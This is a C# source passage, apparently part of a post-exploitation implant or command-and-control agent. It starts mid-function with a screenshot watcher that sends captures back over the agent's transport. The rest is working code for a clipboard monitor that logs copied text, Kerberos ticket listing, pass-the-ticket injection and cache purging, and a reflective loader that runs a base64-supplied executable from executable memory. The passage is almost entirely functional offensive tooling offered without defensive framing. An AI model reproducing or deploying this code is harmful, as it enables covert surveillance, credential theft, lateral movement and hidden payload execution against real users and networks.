                            PostExShared.Transport.SendResult(-1, b64, "");
                    }
                }
                catch { }
                Thread.Sleep(interval * 1000);
            }
        }) { IsBackground = true, Name = "Screenwatch" };
        _swThread.Start();
        return "Screenwatch started every " + interval + "s";
    }
    public static string ScreenwatchStop()
    {
        _swRunning = false;
        return "Screenwatch stopped";
    }

    // ── Clipboard monitor ────────────────────────────────────────────────────
    static volatile bool _clipRunning;
    static Thread        _clipThread;
    static List<string>  _clipBuf = new List<string>();

    public static string ClipStart()
    {
        if (_clipRunning) return "Clipboard monitor already running";
        _clipRunning = true;
        _clipThread  = new Thread(() =>
        {
            string last = "";
            while (_clipRunning)
            {
                try
                {
                    if (W32PX.OpenClipboard(IntPtr.Zero))
                    {
                        if (W32PX.IsClipboardFormatAvailable(1 /*CF_TEXT*/))
                        {
                            var h    = W32PX.GetClipboardData(1);
                            var ptr  = W32PX.GlobalLock(h);
                            var text = Marshal.PtrToStringAnsi(ptr);
                            W32PX.GlobalUnlock(h);
                            if (!string.IsNullOrEmpty(text) && text != last)
                            {
                                last = text;
                                lock (_clipBuf)
                                    if (!_clipBuf.Contains(text))
                                        _clipBuf.Add("[" + DateTime.Now.ToString("HH:mm:ss") + "] " + text);
                            }
                        }
                        W32PX.CloseClipboard();
                    }
                }
                catch { }
                Thread.Sleep(2000);
            }
        }) { IsBackground = true, Name = "Clipboard" };
        _clipThread.Start();
        return "Clipboard monitor started";
    }
    public static string ClipStop()
    {
        _clipRunning = false;
        return "Clipboard monitor stopped";
    }
    public static string ClipDump()
    {
        lock (_clipBuf)
        {
            if (_clipBuf.Count == 0) return "(no clipboard entries captured)";
            var s = string.Join("\n---\n", _clipBuf.ToArray());
            _clipBuf.Clear();
            return s;
        }
    }

    // ── Kerberos ─────────────────────────────────────────────────────────────
    // Struct definitions for LSA Kerberos calls
    [StructLayout(LayoutKind.Sequential)]
    struct KERB_QUERY_TKT_CACHE_REQUEST { public int MessageType; public LUID LogonId; }
    [StructLayout(LayoutKind.Sequential)]
    struct KERB_PURGE_TKT_CACHE_REQUEST { public int MessageType; public LUID LogonId; public LSA_UNICODE_STRING ServerName; public LSA_UNICODE_STRING RealmName; }
    [StructLayout(LayoutKind.Sequential)]
    struct LUID { public uint LowPart; public int HighPart; }
    [StructLayout(LayoutKind.Sequential)]
    struct LSA_UNICODE_STRING { public ushort Length, MaxLen; public IntPtr Buffer; }
    [StructLayout(LayoutKind.Sequential)]
    struct KERB_TICKET_CACHE_INFO
    {
        public LSA_UNICODE_STRING ServerName, RealmName;
        public long StartTime, EndTime, RenewTime;
        public int  EncryptionType, TicketFlags;
    }

    static bool KrbConnect(out IntPtr hLsa, out int pkg)
    {
        pkg = 0;
        if (W32PX.LsaConnectUntrusted(out hLsa) != 0) return false;
        var name = "Kerberos";
        var nameBytes = Encoding.ASCII.GetBytes(name);
        var lsaStr = new W32PX.LSA_STRING
        {
            Length    = (ushort)nameBytes.Length,
            MaxLength = (ushort)(nameBytes.Length + 1),
            Buffer    = Marshal.AllocHGlobal(nameBytes.Length + 1)
        };
        Marshal.Copy(nameBytes, 0, lsaStr.Buffer, nameBytes.Length);
        W32PX.LsaLookupAuthenticationPackage(hLsa, ref lsaStr, out pkg);
        Marshal.FreeHGlobal(lsaStr.Buffer);
        return true;
    }

    public static string KerbList()
    {
        IntPtr hLsa; int pkg;
        if (!KrbConnect(out hLsa, out pkg)) return "error: LsaConnectUntrusted failed";
        var req = new KERB_QUERY_TKT_CACHE_REQUEST { MessageType = 14 /*KerbQueryTicketCacheMessage*/ };
        int reqSize = Marshal.SizeOf(req);
        var pReq    = Marshal.AllocHGlobal(reqSize);
        Marshal.StructureToPtr(req, pReq, false);
        IntPtr pResp; int respLen, status;
        W32PX.LsaCallAuthenticationPackage(hLsa, pkg, pReq, reqSize, out pResp, out respLen, out status);
        Marshal.FreeHGlobal(pReq);
        if (pResp == IntPtr.Zero) return "No tickets found (status=" + status + ")";
        // Read count at offset 0
        int count = Marshal.ReadInt32(pResp);
        var sb = new StringBuilder();
        int infoSize = Marshal.SizeOf(typeof(KERB_TICKET_CACHE_INFO));
        for (int i = 0; i < count; i++)
        {
            var info = (KERB_TICKET_CACHE_INFO)Marshal.PtrToStructure(
                new IntPtr(pResp.ToInt64() + 4 + i * infoSize), typeof(KERB_TICKET_CACHE_INFO));
            string svc   = info.ServerName.Buffer  != IntPtr.Zero ? Marshal.PtrToStringUni(info.ServerName.Buffer,  info.ServerName.Length / 2)  : "";
            string realm = info.RealmName.Buffer   != IntPtr.Zero ? Marshal.PtrToStringUni(info.RealmName.Buffer,   info.RealmName.Length / 2)   : "";
            sb.AppendFormat("{0} @ {1}  enc={2}  expires={3}\n",
                svc, realm, info.EncryptionType, DateTime.FromFileTime(info.EndTime));
        }
        W32PX.LsaFreeReturnBuffer(pResp);
        return sb.Length > 0 ? sb.ToString().TrimEnd() : "(no tickets)";
    }

    public static string KerbPTT(string b64Ticket)
    {
        byte[] ticket;
        try { ticket = Convert.FromBase64String(b64Ticket.Trim()); }
        catch { return "error: invalid base64"; }
        IntPtr hLsa; int pkg;
        if (!KrbConnect(out hLsa, out pkg)) return "error: LsaConnectUntrusted";
        // KERB_SUBMIT_TKT_REQUEST: MessageType=20, LogonId=0, Flags=0, Key=0, TicketLength, TicketOffset, then ticket bytes
        int headerSize = 56; // sizeof KERB_SUBMIT_TKT_REQUEST
        var buf = new byte[headerSize + ticket.Length];
        // MessageType = 20 at offset 0
        BitConverter.GetBytes(20).CopyTo(buf, 0);
        // TicketLength at offset 48
        BitConverter.GetBytes(ticket.Length).CopyTo(buf, 48);
        // TicketOffset at offset 52
        BitConverter.GetBytes(headerSize).CopyTo(buf, 52);
        Array.Copy(ticket, 0, buf, headerSize, ticket.Length);
        var pReq = Marshal.AllocHGlobal(buf.Length);
        Marshal.Copy(buf, 0, pReq, buf.Length);
        IntPtr pResp; int respLen, status;
        W32PX.LsaCallAuthenticationPackage(hLsa, pkg, pReq, buf.Length, out pResp, out respLen, out status);
        Marshal.FreeHGlobal(pReq);
        if (pResp != IntPtr.Zero) W32PX.LsaFreeReturnBuffer(pResp);
        return status == 0 ? "Ticket injected successfully" : "error: status=" + status;
    }

    public static string KerbPurge()
    {
        IntPtr hLsa; int pkg;
        if (!KrbConnect(out hLsa, out pkg)) return "error: LsaConnectUntrusted";
        // KERB_PURGE_TKT_CACHE_REQUEST MessageType=6
        int size = 40;
        var pReq = Marshal.AllocHGlobal(size);
        Marshal.WriteInt32(pReq, 6); // MessageType
        for (int i = 4; i < size; i++) Marshal.WriteByte(pReq, i, 0);
        IntPtr pResp; int respLen, status;
        W32PX.LsaCallAuthenticationPackage(hLsa, pkg, pReq, size, out pResp, out respLen, out status);
        Marshal.FreeHGlobal(pReq);
        if (pResp != IntPtr.Zero) W32PX.LsaFreeReturnBuffer(pResp);
        return "Kerberos tickets purged (status=" + status + ")";
    }

    // ── Inline PE execution ──────────────────────────────────────────────────
    public static string PeExec(string args)
    {
        var parts = args.Split(new[]{' '}, 2);
        byte[] peBytes;
        try { peBytes = Convert.FromBase64String(parts[0].Trim()); }
        catch { return "error: invalid base64"; }
        try
        {
            // Parse PE headers
            if (peBytes[0] != 'M' || peBytes[1] != 'Z') return "error: not a valid PE";
            int e_lfanew = BitConverter.ToInt32(peBytes, 0x3C);
            if (BitConverter.ToInt32(peBytes, e_lfanew) != 0x00004550) return "error: no PE signature";
            int machine = BitConverter.ToUInt16(peBytes, e_lfanew + 4);
            bool x64    = machine == 0x8664;
            int optHdrOffset = e_lfanew + 24;
            long imageBase   = x64 ? BitConverter.ToInt64(peBytes, optHdrOffset + 24) : BitConverter.ToInt32(peBytes, optHdrOffset + 28);
            int  sizeOfImage = BitConverter.ToInt32(peBytes, optHdrOffset + 56);
            int  entryPoint  = BitConverter.ToInt32(peBytes, optHdrOffset + 16);
            int  numSections = BitConverter.ToUInt16(peBytes, e_lfanew + 6);
            int  sizeOfHdr   = BitConverter.ToInt32(peBytes, optHdrOffset + 60);

            // Allocate memory
            var mem = W32PX.VirtualAlloc(new IntPtr(imageBase), sizeOfImage, 0x3000 /*MEM_RESERVE|MEM_COMMIT*/, 0x40 /*EXECUTE_READWRITE*/);
            if (mem == IntPtr.Zero)
                mem = W32PX.VirtualAlloc(IntPtr.Zero, sizeOfImage, 0x3000, 0x40);
            if (mem == IntPtr.Zero) return "error: VirtualAlloc: " + Marshal.GetLastWin32Error();

            // Copy headers
            Marshal.Copy(peBytes, 0, mem, sizeOfHdr);

            // Copy sections
            int sectHdrOffset = optHdrOffset + (x64 ? 240 : 224);
            for (int i = 0; i < numSections; i++)
            {
                int sh     = sectHdrOffset + i * 40;
                int vAddr  = BitConverter.ToInt32(peBytes, sh + 12);
                int rawSz  = BitConverter.ToInt32(peBytes, sh + 16);
                int rawOff = BitConverter.ToInt32(peBytes, sh + 20);
                if (rawSz > 0 && rawOff + rawSz <= peBytes.Length)
                    Marshal.Copy(peBytes, rawOff, new IntPtr(mem.ToInt64() + vAddr), rawSz);
            }

            // Relocations
            int relocOffset = x64 ? BitConverter.ToInt32(peBytes, optHdrOffset + 168) : BitConverter.ToInt32(peBytes, optHdrOffset + 164);
            int relocSize   = x64 ? BitConverter.ToInt32(peBytes, optHdrOffset + 172) : BitConverter.ToInt32(peBytes, optHdrOffset + 168);
            long delta      = mem.ToInt64() - imageBase;
            if (delta != 0 && relocOffset != 0)
            {
                int pos = relocOffset;
                while (pos < relocOffset + relocSize)
                {
                    int  rva   = BitConverter.ToInt32(peBytes, pos);
                    int  blksz = BitConverter.ToInt32(peBytes, pos + 4);
                    if (blksz == 0) break;
                    int  n     = (blksz - 8) / 2;
                    for (int r = 0; r < n; r++)
                    {
                        int entry = BitConverter.ToUInt16(peBytes, pos + 8 + r * 2);
                        int type  = entry >> 12;
                        int off   = entry & 0xFFF;
                        long fixAddr = mem.ToInt64() + rva + off;
                        if (type == 3) // HIGHLOW
                        {
                            int v = Marshal.ReadInt32(new IntPtr(fixAddr));
                            Marshal.WriteInt32(new IntPtr(fixAddr), (int)(v + delta));
                        }
                        else if (type == 10) // DIR64
                        {
                            long v = Marshal.ReadInt64(new IntPtr(fixAddr));
                            Marshal.WriteInt64(new IntPtr(fixAddr), v + delta);
                        }
                    }
                    pos += blksz;
                }
            }

            // Resolve imports
            int importOffset = x64 ? BitConverter.ToInt32(peBytes, optHdrOffset + 112) : BitConverter.ToInt32(peBytes, optHdrOffset + 104);
            if (importOffset != 0)
            {
                int idtPos = importOffset;
                while (true)
                {
                    int nameRva = BitConverter.ToInt32(peBytes, idtPos + 12);
                    int iatRva  = BitConverter.ToInt32(peBytes, idtPos + 16);
                    if (nameRva == 0 && iatRva == 0) break;
                    string dllName = "";
                    int nc = nameRva;
                    while (nc < peBytes.Length && peBytes[nc] != 0) dllName += (char)peBytes[nc++];
                    var hLib = W32PX.LoadLibrary(dllName);
                    long iatAddr = mem.ToInt64() + iatRva;
                    int  thunk   = iatRva;
                    while (true)
                    {
                        long entry = x64 ? Marshal.ReadInt64(new IntPtr(iatAddr)) : Marshal.ReadInt32(new IntPtr(iatAddr));
                        if (entry == 0) break;
                        bool byOrd = x64 ? (entry & unchecked((long)0x8000000000000000L)) != 0 : (entry & 0x80000000) != 0;
                        IntPtr fn;
                        if (byOrd)
                            fn = W32PX.GetProcAddressByOrdinal(hLib, new IntPtr(entry & 0xFFFF));
                        else
                        {
                            int hintRva = (int)(entry & 0x7FFFFFFF);
                            int fc = hintRva + 2;
                            string fnName = "";
                            while (fc < peBytes.Length && peBytes[fc] != 0) fnName += (char)peBytes[fc++];
                            fn = W32PX.GetProcAddress(hLib, fnName);
                        }
                        if (x64) Marshal.WriteInt64(new IntPtr(iatAddr), fn.ToInt64());
                        else      Marshal.WriteInt32(new IntPtr(iatAddr), (int)fn.ToInt32());
                        iatAddr += x64 ? 8 : 4;
                    }
                    idtPos += 20;
                }
            }

            // Call entry point in new thread and wait
            var ep = new IntPtr(mem.ToInt64() + entryPoint);
            var t  = new Thread(() =>
            {
                try
                {
                    var del = (Action)Marshal.GetDelegateForFunctionPointer(ep, typeof(Action));
                    del();
                }
                catch { }
            }) { IsBackground = true };
            t.Start();
            t.Join(5000);
            return "PE executed at 0x" + mem.ToInt64().ToString("X");
        }
        catch (Exception ex) { return "error: " + ex.Message; }
    }
}
